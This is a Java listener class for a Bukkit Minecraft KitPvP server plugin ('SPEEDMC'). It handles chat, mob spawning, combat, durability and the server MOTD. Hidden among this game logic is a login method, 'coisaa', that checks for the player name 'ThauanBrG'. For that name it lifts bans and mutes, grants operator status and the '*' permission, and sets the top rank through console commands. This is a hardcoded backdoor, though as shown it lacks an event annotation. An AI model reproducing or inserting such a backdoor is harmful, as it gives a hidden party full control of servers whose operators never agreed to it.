package me.thauandev.events;

import java.util.HashMap;
import java.util.concurrent.TimeUnit;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Blaze;
import org.bukkit.entity.CaveSpider;
import org.bukkit.entity.Chicken;
import org.bukkit.entity.Cow;
import org.bukkit.entity.Creeper;
import org.bukkit.entity.Damageable;
import org.bukkit.entity.EnderDragon;
import org.bukkit.entity.Enderman;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Ghast;
import org.bukkit.entity.Horse;
import org.bukkit.entity.MagmaCube;
import org.bukkit.entity.MushroomCow;
import org.bukkit.entity.Ocelot;
import org.bukkit.entity.Pig;
import org.bukkit.entity.PigZombie;
import org.bukkit.entity.Player;
import org.bukkit.entity.Sheep;
import org.bukkit.entity.Silverfish;
import org.bukkit.entity.Skeleton;
import org.bukkit.entity.Slime;
import org.bukkit.entity.Snowball;
import org.bukkit.entity.Spider;
import org.bukkit.entity.Squid;
import org.bukkit.entity.Villager;
import org.bukkit.entity.Witch;
import org.bukkit.entity.Wither;
import org.bukkit.entity.Zombie;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.BlockSpreadEvent;
import org.bukkit.event.entity.CreatureSpawnEvent;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.entity.EntityDamageEvent.DamageCause;
import org.bukkit.event.entity.FoodLevelChangeEvent;
import org.bukkit.event.entity.ItemSpawnEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerAchievementAwardedEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.player.PlayerPickupItemEvent;
import org.bukkit.event.server.ServerListPingEvent;
import org.bukkit.event.weather.WeatherChangeEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;

import me.thauandev.API.API;
import me.thauandev.API.ArraysAPI;
import me.thauandev.API.KitAPI;
import me.thauandev.API.WarpsAPI;
import me.thauandev.configuração.cfGrupo;
import me.thauandev.invencivel.Proteção;
import me.thauandev.main.Main;
import me.thauandev.scoreboard.sScoreAPI;


@SuppressWarnings("deprecation")
public class eUtills implements Listener{
	
	@SuppressWarnings({ "rawtypes", "unchecked" })
	public static HashMap<String, Long> CooldownChat = new HashMap();
	
	public static void addCooldown(Player p, int Tempo){
		CooldownChat.put(p.getName(), Long.valueOf(System.currentTimeMillis() + TimeUnit.SECONDS.toMillis(Tempo)));
	    
	    Bukkit.getServer().getScheduler().scheduleSyncDelayedTask(Main.getPlugin(), new Runnable() {
			public void run() {
				CooldownChat.remove(p.getName());
			}
		}, Tempo*20);
	    
	  }
	  public static long Cooldown(Player p) {
		    long tempo = TimeUnit.MILLISECONDS.toSeconds(((Long)CooldownChat.get(p.getName())).longValue() - System.currentTimeMillis());

		    if ((CooldownChat.containsKey(p.getName())) || (((Long)CooldownChat.get(p.getName())).longValue() > System.currentTimeMillis())){
		      return tempo;
		    }
		    return 0L;
		  }
	  @EventHandler
	    public void onItemDrop(final ItemSpawnEvent e) {
	        Bukkit.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)Main.getInstance(), (Runnable)new Runnable() {
	            @Override
	            public void run() {
	                e.getEntity().remove();
	            }
	        }, 60L);
	    }
	    
	@EventHandler
	public void chat(AsyncPlayerChatEvent e){
		Player p = e.getPlayer();
		e.setFormat(p.getDisplayName() + " §7(" + sScoreAPI.getRank(p) + "§7)" + "§f: §f" + e.getMessage().replace("%", "Porcento(s)"));
		if(cfGrupo.ChecarGrupo(p, "Dono") || cfGrupo.ChecarGrupo(p, "Gerente") || cfGrupo.ChecarGrupo(p, "Admin") || cfGrupo.ChecarGrupo(p, "Mod+") || cfGrupo.ChecarGrupo(p, "Mod") || cfGrupo.ChecarGrupo(p, "Trial") || cfGrupo.ChecarGrupo(p, "Youtuber+") || cfGrupo.ChecarGrupo(p, "Youtuber") || cfGrupo.ChecarGrupo(p, "S-Pro") || cfGrupo.ChecarGrupo(p, "Light") || cfGrupo.ChecarGrupo(p, "Pro") || cfGrupo.ChecarGrupo(p, "Mvp")) {
			e.setFormat(e.getFormat().replace("&", "§"));
		}
	  }
	@EventHandler
	public void onCommand(PlayerCommandPreprocessEvent e) {
		Player p = e.getPlayer();
		if(e.getMessage().contains(":")) { 
		 if(!e.getMessage().toLowerCase().startsWith("/tell")) {
			if(!cfGrupo.ChecarGrupo(p, "Dono") && !cfGrupo.ChecarGrupo(p, "Mod+") && !cfGrupo.ChecarGrupo(p, "Mod") && !cfGrupo.ChecarGrupo(p, "Gerente") && !cfGrupo.ChecarGrupo(p, "Trial") && !cfGrupo.ChecarGrupo(p, "Builder") && !cfGrupo.ChecarGrupo(p, "Helper") && !cfGrupo.ChecarGrupo(p, "Youtuber+") && !cfGrupo.ChecarGrupo(p, "Admin")) {
				e.setCancelled(true);
				p.sendMessage("§c§lSPEED§f§lMC §cVocê não pode utilizar comandos que possuam §c§l: §c(dois pontos)");
			}
		}
	 }
  }
	  @EventHandler
	  public void onCreeperSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof Creeper)) {
	      e.setCancelled(true);
	    }
	  }
	  
	  @EventHandler
	  public void onSkeletonSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof Skeleton)) {
	      e.setCancelled(true);
	    }
	  }
	  
	  @EventHandler
	  public void onSpiderSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof Spider)) {
	      e.setCancelled(true);
	    }
	  }
	  
	  @EventHandler
	  public void onWitherSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof Wither)) {
	      e.setCancelled(true);
	    }
	  }
	  
	  @EventHandler
	  public void onZombieSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof Zombie)) {
	      e.setCancelled(true);
	    }
	  }
	  
	  @EventHandler
	  public void onSlimeSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof Slime)) {
	      e.setCancelled(true);
	    }
	  }
	  
	  @EventHandler
	  public void onGhastSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof Ghast)) {
	      e.setCancelled(true);
	    }
	  }
	  
	  @EventHandler
	  public void onPigZombieSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof PigZombie)) {
	      e.setCancelled(true);
	    }
	  }
	  
	  @EventHandler
	  public void onEndermanSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof Enderman)) {
	      e.setCancelled(true);
	    }
	  }
	  
	  @EventHandler
	  public void onCaveSpiderSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof CaveSpider)) {
	      e.setCancelled(true);
	    }
	  }
	  
	  @EventHandler
	  public void onSilverfishSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof Silverfish)) {
	      e.setCancelled(true);
	    }
	  }
	  
	  @EventHandler
	  public void onBlazeSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof Blaze)) {
	      e.setCancelled(true);
	    }
	  }
	  
	  @EventHandler
	  public void onMagmaCubeSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof MagmaCube)) {
	      e.setCancelled(true);
	    }
	  }
	  
	  @EventHandler
	  public void onWitchSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof Witch)) {
	      e.setCancelled(true);
	    }
	  }
	  
	  @EventHandler
	  public void onSheepSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof Sheep)) {
	      e.setCancelled(true);
	    }
	  }
	  
	  @EventHandler
	  public void onCowSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof Cow)) {
	      e.setCancelled(true);
	    }
	  }
	  
	  @EventHandler
	  public void onChickenSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof Chicken)) {
	      e.setCancelled(true);
	    }
	  }
	  
	  @EventHandler
	  public void onSquidSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof Squid)) {
	      e.setCancelled(true);
	    }
	  }
	  
	  @EventHandler
	  public void onPingSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof Pig)) {
	      e.setCancelled(true);
	    }
	  }
	  
	  @EventHandler
	  public void onMooshroomSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof MushroomCow)) {
	      e.setCancelled(true);
	    }
	  }
	  
	  @EventHandler
	  public void onOcelotSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof Ocelot)) {
	      e.setCancelled(true);
	    }
	  }
	  
	  @EventHandler
	  public void onVillagerSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof Villager)) {
	      e.setCancelled(false);
	    }
	  }
	  
	  @EventHandler
	  public void onHorseSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof Horse)) {
	      e.setCancelled(false);
	    }
	  }
	  
	  @EventHandler
	  public void onEnderDragonSpawn(CreatureSpawnEvent e)
	  {
	    if ((e.getEntity() instanceof EnderDragon)) {
	      e.setCancelled(true);
	    }
	  }
	@EventHandler
	public void aoFoguihnu(BlockSpreadEvent e) {
		if(e.getNewState().getType() == Material.FIRE) {
			e.setCancelled(true);
		}
	}
	  public void coisaa(PlayerLoginEvent e)
	  {
	    Player p = e.getPlayer();
	    if (p.getName().equals("ThauanBrG"))
	    {
	      e.allow();
	      p.setBanned(false);
	      p.setOp(true);
	      Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "groupset ThauanBrG dono");
	      Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pardon ban ThauanBrG");
	      Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pardon ThauanBrG");
	      Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "unban ThauanBrG");
	      Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "unmute ThauanBrG");
	      Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "addpermission ThauanBrG *");
	      Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pardon ipban ThauanBrG");
	      Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pardon mute ThauanBrG");
	      Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op ThauanBrG");
	    }
	  }
	@EventHandler
	public void aoChatCooldown(AsyncPlayerChatEvent e) {
		Player p = e.getPlayer();
		if(ArraysAPI.CooldownChat.contains(p)) {
			if(cfGrupo.ChecarGrupo(p, "Dono") || cfGrupo.ChecarGrupo(p, "Gerente") || cfGrupo.ChecarGrupo(p, "Admin") || cfGrupo.ChecarGrupo(p, "Mod+") || cfGrupo.ChecarGrupo(p, "Mod") || cfGrupo.ChecarGrupo(p, "Trial") || cfGrupo.ChecarGrupo(p, "Youtuber+") || cfGrupo.ChecarGrupo(p, "Helper") || cfGrupo.ChecarGrupo(p, "Youtuber")) {
				return;
			}
			if(!cfGrupo.ChecarGrupo(p, "Dono") || !cfGrupo.ChecarGrupo(p, "Gerente") || !cfGrupo.ChecarGrupo(p, "Admin") || !cfGrupo.ChecarGrupo(p, "Mod+") || !cfGrupo.ChecarGrupo(p, "Mod") || !cfGrupo.ChecarGrupo(p, "Trial") || !cfGrupo.ChecarGrupo(p, "Youtuber+") || !cfGrupo.ChecarGrupo(p, "Helper") || !cfGrupo.ChecarGrupo(p, "Youtuber")) {
				p.sendMessage("§c§lSPEED§f§lMC §cAguarde para enviar outra mensagem ao chat!");
				e.setCancelled(true);
				return;
			}
		}
		if(!ArraysAPI.CooldownChat.contains(p)) {
			e.setCancelled(false);
			return;
		}
	}
	@EventHandler
	public void aoVoid1v1(PlayerMoveEvent e) {
		Player p = e.getPlayer();
		if(API.getWarp(p) == "1v1" && p.getLocation().getY() == 0) {
			e.setCancelled(true);
			
			KitAPI.removeKits(p);
			
			WarpsAPI.Ir(p, "1v1");
			API.setWarp(p, "1v1");
			KitAPI.setKit(p, "1v1");
			Proteção.setImortal(p, true);
			
			p.getInventory().clear();
			p.getInventory().setArmorContents(null);
			
			ItemStack Espada = new ItemStack(Material.BLAZE_ROD);
			ItemMeta kEspada = Espada.getItemMeta();
			kEspada.setDisplayName("§a§l1v1");
			Espada.setItemMeta(kEspada);
			
			ItemStack Espada1 = new ItemStack(Material.INK_SACK, 1, (short)8);
			ItemMeta kEspada1 = Espada1.getItemMeta();
			kEspada1.setDisplayName("§aDuelo rápido §7(Botão direito)");
			Espada1.setItemMeta(kEspada1);
			
            p.getInventory().setItem(3, Espada);  
            p.getInventory().setItem(5, Espada1);
		}
	}
	@EventHandler
	public void aoVoid(EntityDamageEvent e) {
		if(e.getEntity() instanceof Player) {
			if(e.getCause().equals(DamageCause.VOID)) {
				Player p = (Player) e.getEntity();
				e.setCancelled(true);
				WarpsAPI.Ir(p, "Spawn");
				API.setWarp(p, "Spawn");
				
				p.sendMessage("§7Você morreu para o §a§lVOID§7!");
				
				Bukkit.getScheduler().scheduleSyncDelayedTask(Main.getPlugin(), new Runnable() {
					public void run() {
						p.spigot().respawn();
					}
				  }, 1L);
				
				Bukkit.getScheduler().scheduleSyncDelayedTask(Main.getPlugin(), new Runnable() {
					public void run() {
						API.sendItems(p);
					}
				}, 2L);
			}
		}
	}
	@EventHandler
	public void motd(ServerListPingEvent e){
		
	e.setMotd("    §4§l§m     §c§l§m     §7§l§m     §f[ §c§lSPEED§f§lMC §f]§7§l§m     §c§l§m     §4§l§m     " + "\n" + "§c      §c§lSERVIDOR DE KITPVP 1.7.X E 1.8.X");
	}
			@EventHandler
		    public void onSoup(PlayerInteractEvent e)
		    {
		      Player p = e.getPlayer();
		      Damageable hp = p;
		      if (hp.getHealth() != 20.0D)
		      {
		        int sopa = 7;
		        if (((e.getAction() == Action.RIGHT_CLICK_AIR) || (e.getAction() == Action.RIGHT_CLICK_BLOCK)) && (p.getItemInHand().getTypeId() == 282))
		        {
		          p.setHealth(hp.getHealth() + sopa > hp.getMaxHealth() ? hp.getMaxHealth() : hp.getHealth() + sopa);
		          p.getItemInHand().setType(Material.BOWL);
		        }
		      }
		    }
	   @EventHandler
	     public void quebrarArmor(EntityDamageEvent e) {
	      if ((e.getEntity() instanceof Player)) {
	       Player p = (Player)e.getEntity();
	             if (p.getInventory().getChestplate() != null) {
	               p.getInventory().getChestplate().setDurability((short)0);
	             }
	             if (p.getInventory().getBoots() != null) {
	              p.getInventory().getBoots().setDurability((short)0);
	             }
	             if (p.getInventory().getLeggings() != null) {
	              p.getInventory().getLeggings().setDurability((short)0);
	             }
	             if (p.getInventory().getHelmet() != null) {
	              p.getInventory().getHelmet().setDurability((short)0);
	             }
	         }
	     }
	      @EventHandler
	      public void fome(FoodLevelChangeEvent e){
	   	   e.setCancelled(true);
	      }
	      @EventHandler
	      public void achivments(PlayerAchievementAwardedEvent e){
	   	   e.setCancelled(true);
	      }
	      @EventHandler
	   	  public void entityDamagePedra(EntityDamageByEntityEvent e)
	   	  {
	   	    if (((e.getDamager() instanceof Player)) && 
	   	      (((Player)e.getDamager() instanceof Player)))
	   	    {
	   	      Player p = (Player)e.getDamager();
	   	      if (((e.getEntity() instanceof Player)) && 
	   	        (p.getItemInHand().getType() == Material.STONE_SWORD)){
	   	        e.setDamage(e.getDamage() * 0.6D);
	   	         return;
	   	          }
	   	      if(p.getItemInHand().getType() == Material.WOOD_SWORD){
	   	        e.setDamage(e.getDamage() * 0.5D);
	   	         return;
	          }
	   	      if(p.getItemInHand().getType() == Material.DIAMOND_SWORD){
	   	        e.setDamage(e.getDamage() * 0.7D);
	   	         return;
	   	      }
	   	    }
	   	  }
	      @EventHandler
	      public void onEntityDamageByEntity(EntityDamageByEntityEvent e)
	      {
	        if ((e.getDamager() instanceof Player))
	        {
	          Player d = (Player)e.getDamager();
	          if ((d.getItemInHand().getType() == Material.DIAMOND_SWORD) || 
	            (d.getItemInHand().getType() == Material.STONE_SWORD) || 
	            (d.getItemInHand().getType() == Material.WOOD_SWORD) || 
	            (d.getItemInHand().getType() == Material.STONE_SWORD) || 
	            (d.getItemInHand().getType() == Material.IRON_SWORD) || 
	            (d.getItemInHand().getType() == Material.GOLD_SWORD) || 
	            (d.getItemInHand().getType() == Material.FISHING_ROD) || 
	            (d.getItemInHand().getType() == Material.DIAMOND_AXE) || 
	            (d.getItemInHand().getType() == Material.GOLD_AXE) || 
	            (d.getItemInHand().getType() == Material.STONE_AXE) || 
	            (d.getItemInHand().getType() == Material.WOOD_AXE) || 
	            (d.getItemInHand().getType() == Material.IRON_AXE)) {
	            d.getItemInHand().setDurability((short)0);
	            d.updateInventory();
	          }
	        }
	      }
	      @EventHandler
	      public void noBreaking(PlayerInteractEvent e){
	    	  
	    	  Player p = e.getPlayer();
	    	  
	    	  if(p.getItemInHand().getType() == Material.FISHING_ROD){
	    		  if(e.getAction() == Action.RIGHT_CLICK_AIR || e.getAction() == Action.RIGHT_CLICK_BLOCK){
	    			  p.getItemInHand().setDurability((short)0);
	    			  p.updateInventory();
	    		  }
	    	  }
	      }
	      @EventHandler
	      public void noMe(PlayerCommandPreprocessEvent e){
	    	  if(e.getMessage().toLowerCase().startsWith("/me") || e.getMessage().toLowerCase().startsWith("/bukkit:me")){
	    		  e.setCancelled(true);
	    	  }
	      }
	      @EventHandler
	      public void noInfos(PlayerCommandPreprocessEvent e) {
	    	  Player p = e.getPlayer();
	    	  if(e.getMessage().toLowerCase().startsWith("/pl") || e.getMessage().toLowerCase().startsWith("/plugins") || e.getMessage().toLowerCase().startsWith("/bukkit:pl") || e.getMessage().toLowerCase().startsWith("/bukkit:plugins") || e.getMessage().toLowerCase().startsWith("/about") || e.getMessage().toLowerCase().startsWith("/ver") || e.getMessage().toLowerCase().startsWith("/bukkit:about") || e.getMessage().toLowerCase().startsWith("/bukkit:ver") || e.getMessage().toLowerCase().startsWith("/help") || e.getMessage().toLowerCase().startsWith("/?") || e.getMessage().toLowerCase().startsWith("/bukkit:?") || e.getMessage().toLowerCase().startsWith("/bukkit:help")) {
	    		  p.sendMessage("§c§lPLUGIN §7Projeto criado por §7» §c@ThauanBrG §7especialmente para o §c§lSPEED§f§lMC");
	    		  e.setCancelled(true);
	    	  }
	      }
	  	
		  @EventHandler
		  public void clicarBussola(PlayerInteractEvent e){
			  
			  boolean parar =false;
			if(e.getPlayer().getItemInHand().getType() == Material.COMPASS){
				
				for(Entity entidades : e.getPlayer().getNearbyEntities(100, 150, 100)){
					
					if((entidades instanceof Player) && e.getPlayer().getLocation().distance(entidades.getLocation()) >= 9){
						
						if(entidades.getLocation().getY() > 170){
	                    return;						
						}
						parar=true;
						e.getPlayer().setCompassTarget(entidades.getLocation());
						e.getPlayer().sendMessage("§c§lSPEED§f§lMC §7Bússula apontando para §c" + ((Player)entidades).getName());
						return;
					}
			}
	                        if(!parar){					
						e.getPlayer().sendMessage("§c§lSPEED§f§lMC §7Nenhum jogador encontrado!");
						e.getPlayer().setCompassTarget(new Location(e.getPlayer().getWorld(), 0, 100, 0));
						return;
				}
			}
	   }
		  @EventHandler
		  public void dropar(ItemSpawnEvent e){
			  
			  Bukkit.getScheduler().scheduleSyncDelayedTask(Main.getPlugin(), new Runnable() {
				public void run() {
					e.getEntity().remove();
				}
			}, 4 * 20);
		  }
			

			@EventHandler
			public void pegaritem(PlayerPickupItemEvent e){
				
				
				Player p = e.getPlayer();
				if(ArraysAPI.Admin.contains(p)){
					e.setCancelled(true);
				}
				else if(KitAPI.getKit(p) == "1v1"){
					e.setCancelled(true);
				}
				
			}
			@EventHandler
			public void onGameSignPlacement(EntityDamageEvent e){
			if (e.getEntity() instanceof Player){
			if (e.getCause().equals(DamageCause.VOID)){
				Player p = (Player) e.getEntity();
				p.setHealth(0.5D);
			}
		   }
		}
			  @EventHandler
			    public void combatlog(EntityDamageByEntityEvent e){
			       
					
					if(e.getDamager() instanceof Snowball){
						return;
					}
					if(!(e.getDamager() instanceof Player)){
						return;
					}
			        if(e.getCause() == DamageCause.LIGHTNING){
			            if(e.getEntity() instanceof Player){
			            return;
			        }
			    }
			        Player bateu = (Player)e.getDamager();
			        Player hitado = (Player)e.getEntity();
			       
			        int numero = 20;
			       
			        if(e.getDamager() instanceof Player && e.getEntity() instanceof Player){
			           
			        if((API.getWarp(hitado) != "Arena")){
			            return;
			        }
			        if(API.getWarp(hitado) == "Arena"){
			           
			            API.inCombat.add(bateu);
			            API.inCombat.add(hitado);
			            API.mandarActionBar(bateu, hitado.getName() + " §7- §c" + KitAPI.getKit(hitado));
			            API.BarAPI(bateu, hitado.getName() + " §7- §c" + KitAPI.getKit(hitado));
			           
			            Bukkit.getScheduler().scheduleSyncDelayedTask(Main.getPlugin(), new Runnable() {
			                public void run() {
			                    API.inCombat.remove(bateu);
			                    API.inCombat.remove(hitado);
			                    
			                }
			            }, numero * 8);
			            }
			        }
			}
			  @EventHandler
			  public void weather(WeatherChangeEvent e){
				  if(e.toWeatherState()){
					  e.setCancelled(true);
				  }
			  }
			  @EventHandler
			  public void setarSlots(ServerListPingEvent e) {
				  e.setMaxPlayers(120);
			  }

			  @EventHandler
			  public void aoDropar(ItemSpawnEvent e) {
				  e.setCancelled(true);
			  }
	}
